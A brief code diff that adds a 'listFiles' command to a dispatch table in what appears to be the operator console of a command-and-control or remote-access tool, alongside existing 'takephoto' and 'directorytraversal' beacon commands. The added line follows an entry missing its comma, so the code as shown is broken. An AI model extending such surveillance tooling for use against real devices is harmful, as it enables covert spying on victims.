@@ -155,6 +155,7 @@ class MultiHandlerCommands:
             "directorytraversal": lambda: self.beaconCommands.dir_traversal(
                 UserID),
             "takephoto": lambda: self.beaconCommands.takePhoto(UserID)
+            "listFiles": lambda: self.beaconCommands.list_files(UserID),
         }
 
         while True:
